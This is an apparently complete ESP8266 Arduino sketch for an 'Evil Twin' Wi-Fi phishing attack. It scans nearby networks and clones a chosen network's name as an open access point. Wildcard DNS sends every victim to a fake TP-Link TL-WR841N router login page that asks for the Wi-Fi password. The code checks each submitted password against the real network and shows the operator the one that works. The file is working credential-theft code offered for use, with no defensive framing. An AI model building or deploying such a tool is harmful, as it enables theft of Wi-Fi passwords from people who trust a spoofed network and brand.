#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String webpageStatic = "<!DOCTYPE html> <html lang=\"en\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> <meta http-equiv=\"Pragma\" content=\"no-cache\"> <meta http-equiv=\"Expires\" content=\"0\"> <style type=\"text/css\"> body { font-family: Arial, \"sans-serief\"; background-color: #FFFFFF; margin: 0px; padding: 0px; } div.loginBox { height: calc(100vh - 150px); display: flex; justify-content: center; align-items: center; flex-direction: column; gap: 40px; } .topLogo { background-color: #4ACBD6; height: 96px; overflow: hidden; } ul { padding: 0; margin: 0px; list-style: none; } ul li { height: 32px; width: 250px; text-align: left; } li.pwLi { border: 1px solid #a7a9ac; border-radius: 5px; } input.text { border: 0px; height: 32px; line-height: 32px; width: 175px; padding: 0px; font-size: 14px; color: #A7A9AC; font-family: \"Arial\", \"Verdana\"; font-weight: normal; background-color: transparent; vertical-align: top; } input.text:focus { outline: none; } .loginBtn { height: 32px; display: inline-block; width: 250px; margin-top: 8px; line-height: 32px; color: #FFFFFF; font-size: 18px; font-family: Arial; background: #4acbd6; border-radius: 5px; cursor: pointer; border: none; } li svg { line-height: 40px; margin: 9px 6px 9px 9px; } html { overflow: hidden; } table, tr, td { padding: 0; } td { font-family: \"Times New Roman\", \"ËÎÌå\"; font-size: 12px; } form { font-family: \"Times New Roman\", \"ËÎÌå\"; font-size: 12px; } .style1 { font-family: Arial; color: #FFFFFF; font-size: 18px; padding-right: 50; text-align: left; font-weight: bold; white-space: nowrap; } .style2 { font-size: 14px; font-family: Arial; font-weight: bold; padding-right: 50; text-align: left; white-space: nowrap; color: #FFFFFF; } tr { vertical-align: top; } #first-td { width: 234px; } #first-td svg { margin: 27px 0 0 25px; cursor: pointer; } #second-td { padding-top: 25px; } #third-td svg { float: right; opacity: 0.3; filter: alpha(opacity=30); margin-right: 14px; } input[type=\"text\"]::-ms-clear, input[type='password']::-ms-reveal { display: none; } .noteDiv { color: gray; font-family: Arial; text-align: center; font-size: 14px; } #note { display: inline-block; font-weight: bold; } </style> <title>TL-WR841N</title> </head> <body> <div class=\"topLogo\"> <table cellspacing=\"0\" width=\"100%\"> <tbody> <tr> <td> <table border=\"0\" cellspacing=\"0\" width=\"100%\"> <tbody> <tr> <td id=\"first-td\"> <div> <svg version=\"1.1\" viewBox=\"0 0 420 160\" xmlns=\"http://www.w3.org/2000/svg\" width=\"129\" height=\"49\"> <path d=\"m0 111.36c0 4.1599 3.4759 8.3198 8.2158 8.3198h31.615v32.003c0 4.1599 3.4759 8.3198 8.2158 8.3198h27.031v-76.002h-75.078zm100.21-111.36c-33.035 0-59.427 26.559-59.427 59.355v12.644h33.187v-12.644c0-14.236 11.54-25.755 26.239-25.755 14.54 0 24.659 10.236 24.659 25.435 0 15.044-10.908 26.083-25.455 26.083h-12.484v33.591h12.484c32.411 0 58.651-26.711 58.651-59.679 0-34.231-24.499-59.031-57.855-59.031\" fill=\"#fff\" /> <path d=\"m420 119.68-20.711-23.675 18.496-21.283h-11.548l-16.588 19.84v-40.151l-9.8038 4.9559v57.759c0 1.436 1.104 2.5599 2.3719 2.5599h7.4318v-22.399l18.332 22.399h12.02zm-70.818-46.243c-7.9078 0-16.128 4.1679-20.236 10.244v33.599c0 1.276 1.112 2.4 2.3719 2.4h7.4318v-31.999c2.3639-3.0359 6.1638-4.9559 10.432-4.9559 6.7958 0 11.692 5.4359 11.692 12.636v24.319h9.6438v-24.639c4e-3 -12.316-9.1678-21.603-21.335-21.603m-35.091-19.992c-3.6319 0-6.6398 2.8839-6.6398 6.5598 0 1.76 0.62799 3.1959 1.736 4.3199h9.8038c1.104-1.124 1.736-2.5599 1.736-4.3199 4e-3 -3.6799-2.9999-6.5598-6.6358-6.5598m4.9039 66.234v-44.959h-9.8038v42.559c0 1.276 1.112 2.4 2.3719 2.4zm-29.563-2.4c0 1.276 1.112 2.4 2.372 2.4h7.4318v-65.27l-9.8038 4.9559zm-21.971-15.196h13.28v-9.9237h-18.024zm-34.615-28.159c-8.3758 0-17.228 4.4799-21.655 11.04v49.271c0 1.284 1.104 2.4 2.3719 2.4h7.4238v-47.671c2.3719-3.5239 6.7998-5.7639 11.7-5.7639 7.5838 0 13.12 5.7639 13.12 13.92 0 8.0038-5.5359 14.084-13.12 14.084h-6.9558v8.4798h7.1158c13.12 0 22.759-9.4398 22.759-22.559-4e-3 -13.284-9.7998-23.199-22.759-23.199m-43.943 30.711v-21.115h12.644v-8.7998h-12.644v-13.592l-9.8038 4.9559v40.643c0 8.3158 4.8999 12.96 13.596 12.96h12.644v-8.4798h-10.112c-4.7479-4e-3 -6.3238-1.772-6.3238-6.5718\" fill=\"#fff\" /> </svg> </div> </td> <td id=\"second-td\"> <table> <tbody> <tr> <td id=\"mname\" class=\"style1\">TP-Link Wireless N Router WR841N </td> </tr> <tr> <td id=\"mnum\" class=\"style2\">Model No. TL-WR841N</td> </tr> </tbody> </table> </td> <td id=\"third-td\"> <svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" width=\"223\" height=\"111\"> <path d=\"M0 0 C6.27 0 12.54 0 19 0 C19 5.61 19 11.22 19 17 C33.85 17 48.7 17 64 17 C64 32.51 64 48.02 64 64 C57.73 64 51.46 64 45 64 C42 61 42 61 41.65942383 58.73168945 C41.6829895 57.43557739 41.6829895 57.43557739 41.70703125 56.11328125 C41.7215332 54.7065918 41.7215332 54.7065918 41.73632812 53.27148438 C41.76146484 52.29501953 41.78660156 51.31855469 41.8125 50.3125 C41.83280273 48.83040039 41.83280273 48.83040039 41.85351562 47.31835938 C41.88887797 44.87835769 41.93822967 42.43945281 42 40 C41.37955811 40.01047363 40.75911621 40.02094727 40.11987305 40.03173828 C37.30912323 40.07330886 34.4984381 40.09932933 31.6875 40.125 C30.71103516 40.14175781 29.73457031 40.15851562 28.72851562 40.17578125 C27.79072266 40.18222656 26.85292969 40.18867187 25.88671875 40.1953125 C25.02264404 40.20578613 24.15856934 40.21625977 23.26831055 40.22705078 C21 40 21 40 18 38 C17.65942383 35.93701172 17.65942383 35.93701172 17.70703125 33.4296875 C17.71669922 32.53378906 17.72636719 31.63789063 17.73632812 30.71484375 C17.76146484 29.77769531 17.78660156 28.84054688 17.8125 27.875 C17.83280273 26.45767578 17.83280273 26.45767578 17.85351562 25.01171875 C17.88893694 22.67391221 17.93832729 20.33723763 18 18 C16.700625 18.020625 15.40125 18.04125 14.0625 18.0625 C12.70834367 18.08399454 11.35243917 18.07148199 10 18 C9 17 9 17 8.90234375 15.15234375 C8.95117188 12.07617188 8.95117188 12.07617188 9 9 C7.700625 9.020625 6.40125 9.04125 5.0625 9.0625 C3.70834367 9.08399454 2.35243917 9.07148199 1 9 C0.67 8.67 0.34 8.34 0 8 C0 5.36 0 2.72 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(140,0)\" /> <path d=\"M0 0 C15.18 0 30.36 0 46 0 C46 15.18 46 30.36 46 46 C39.4 46 32.8 46 26 46 C24 44 24 44 23.77294922 41.75341797 C23.78342285 40.84221191 23.79389648 39.93100586 23.8046875 38.9921875 C23.81113281 38.00605469 23.81757812 37.01992187 23.82421875 36.00390625 C23.84097656 34.97136719 23.85773438 33.93882813 23.875 32.875 C23.88402344 31.83472656 23.89304687 30.79445313 23.90234375 29.72265625 C23.92596253 27.14820908 23.95889851 24.57421788 24 22 C23.01604248 22.01571045 23.01604248 22.01571045 22.01220703 22.03173828 C19.04984342 22.07322503 16.08754084 22.09930262 13.125 22.125 C12.09246094 22.14175781 11.05992188 22.15851563 9.99609375 22.17578125 C9.00996094 22.18222656 8.02382813 22.18867187 7.0078125 22.1953125 C5.64100342 22.21102295 5.64100342 22.21102295 4.24658203 22.22705078 C2 22 2 22 0 20 C0 13.4 0 6.8 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(50,65)\" /> <path d=\"M0 0 C7.59 0 15.18 0 23 0 C23 7.59 23 15.18 23 23 C33.56 23 44.12 23 55 23 C55 33.89 55 44.78 55 56 C50.05 56 45.1 56 40 56 C39 55 39 55 38.90234375 51.40234375 C38.9090178 49.91403133 38.92097817 48.42573568 38.9375 46.9375 C38.94201172 46.17888672 38.94652344 45.42027344 38.95117188 44.63867188 C38.9629932 42.75908129 38.98092922 40.87953101 39 39 C37.86820313 39.03480469 36.73640625 39.06960937 35.5703125 39.10546875 C34.08855647 39.13360336 32.60678444 39.16090387 31.125 39.1875 C30.37863281 39.21263672 29.63226563 39.23777344 28.86328125 39.26367188 C26.6953125 39.29296875 26.6953125 39.29296875 23 39 C20.64880601 35.47320901 20.78556548 33.97120515 20.875 29.8125 C20.89304688 28.72582031 20.91109375 27.63914062 20.9296875 26.51953125 C20.95289063 25.68808594 20.97609375 24.85664062 21 24 C19.700625 24.020625 18.40125 24.04125 17.0625 24.0625 C15.70834367 24.08399454 14.35243917 24.07148199 13 24 C12 23 12 23 11.90234375 20.49609375 C11.91394531 19.48675781 11.92554688 18.47742188 11.9375 17.4375 C11.94652344 16.42558594 11.95554688 15.41367187 11.96484375 14.37109375 C11.97644531 13.58863281 11.98804688 12.80617188 12 12 C11.21753906 12.01160156 10.43507812 12.02320313 9.62890625 12.03515625 C8.61699219 12.04417969 7.60507813 12.05320312 6.5625 12.0625 C5.55316406 12.07410156 4.54382813 12.08570313 3.50390625 12.09765625 C1 12 1 12 0 11 C0 7.37 0 3.74 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(128,40)\" /> <path d=\"M0 0 C7.59 0 15.18 0 23 0 C23 7.59 23 15.18 23 23 C19.37 23 15.74 23 12 23 C12 19.04 12 15.08 12 11 C8.04 11 4.08 11 0 11 C0 7.37 0 3.74 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(50,13)\" /> <path d=\"M0 0 C6.27 0 12.54 0 19 0 C19 6.27 19 12.54 19 19 C16.03 19 13.06 19 10 19 C9 18 9 18 8.90234375 16.15234375 C8.95117188 13.07617188 8.95117188 13.07617188 9 10 C7.700625 10.020625 6.40125 10.04125 5.0625 10.0625 C3.70834367 10.08399454 2.35243917 10.07148199 1 10 C0.67 9.67 0.34 9.34 0 9 C0 6.03 0 3.06 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(93,46)\" /> <path d=\"M0 0 C5.94 0 11.88 0 18 0 C18 5.94 18 11.88 18 18 C15.03 18 12.06 18 9 18 C9 15.03 9 12.06 9 9 C6.03 9 3.06 9 0 9 C0 6.03 0 3.06 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(0,73)\" /> <path d=\"M0 0 C5.94 0 11.88 0 18 0 C18 5.94 18 11.88 18 18 C15.36 18 12.72 18 10 18 C9 17 9 17 8.90234375 15.15234375 C8.95117188 12.07617188 8.95117188 12.07617188 9 9 C6.03 9 3.06 9 0 9 C0 6.03 0 3.06 0 0 Z \" fill=\"#FFFFFF\" transform=\"translate(204,64)\" /> </svg> </td> </tr> </tbody> </table> </td> </tr> </tbody> </table> </div> <div class=\"loginBox\">";

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(9600);
  pinMode(D4, OUTPUT);
  digitalWrite(D4, HIGH); // turn off the led
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("M1z23R", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    // wrong password page 
    String html = webpageStatic + "<div class=\"noteDiv\"> <span id=\"note\">Wrong Password. <br /> <br> <small>Please, try again.</small></span> </div> </div> <script> setTimeout(function () { window.location.href = '/'; }, 5000); </script> </body> </html>";
    webServer.send(200, "text/html", html);
    Serial.println("Wrong password tried !");
  } else {
    // currect password: Connected Page
    String html = webpageStatic + "<div class=\"noteDiv\"> <span id=\"note\">Connected !</span> </div> </div> </body> </html>";
    webServer.send(200, "text/html", html);
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("M1z23R", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    digitalWrite(D4, LOW); // turn on the led
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      // please wait page
      String html = webpageStatic + "<div class=\"noteDiv\"> <span id=\"note\">Please wait...</span> </div> </div> <script> setTimeout(function () { window.location.href = '/result'; }, 10000); </script> </body> </html>";
      webServer.send(200, "text/html", html);
    } else {
      // login page
      String html = webpageStatic + "<div class=\"noteDiv\"> <span id=\"note\">NOTE:&emsp;Enter your WiFi password.</span> </div> <div class=\"panelThre\"> <form align=\"center\" class=\"picDiv\" action='/'> <ul> <li id=\"pwLi\" class=\"pwLi\"> <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\" width=\"15\" height=\"15\" viewBox=\"0 0 256 256\" xml:space=\"preserve\"> <defs> </defs> <g style=\"stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;\" transform=\"translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)\"> <path d=\"M 81.549 8.451 c -11.248 -11.25 -29.553 -11.25 -40.803 0 c -8.447 8.447 -10.786 21.129 -6.028 31.975 L 1.501 73.643 c -0.341 0.341 -0.547 0.793 -0.581 1.272 L 0.005 87.858 c -0.041 0.578 0.171 1.146 0.581 1.556 C 0.962 89.791 1.471 90 2 90 c 0.047 0 0.094 -0.002 0.141 -0.005 l 12.943 -0.915 c 0.48 -0.034 0.933 -0.24 1.273 -0.581 l 3.928 -3.929 c 0.304 -0.304 0.501 -0.696 0.564 -1.121 l 1.169 -7.903 l 7.887 -1.169 c 0.872 -0.129 1.556 -0.813 1.685 -1.686 l 1.168 -7.886 l 7.903 -1.169 c 0.425 -0.063 0.818 -0.261 1.122 -0.564 l 7.79 -7.79 c 10.849 4.758 23.528 2.419 31.975 -6.028 C 86.999 43.805 90 36.559 90 28.853 C 90 21.146 86.999 13.9 81.549 8.451 z M 73.869 25.908 c -2.7 2.7 -7.077 2.7 -9.777 0 s -2.7 -7.077 0 -9.777 s 7.077 -2.7 9.777 0 S 76.569 23.208 73.869 25.908 z\" style=\"stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #4cd0dc; fill-rule: nonzero; opacity: 1\" transform=\" matrix(1 0 0 1 0 0) \" stroke-linecap=\"round\" /> </g> </svg><input class=\"text\" id='password' name='password' minlength='8' type=\"password\" placeholder=\"Password\" autocomplete=\"off\"> </li> </ul> <input type=\"submit\" value=\"Login\" class=\"loginBtn\"> </form> </div> </div> </body> </html>";
      webServer.send(200, "text/html", html);
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;


uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
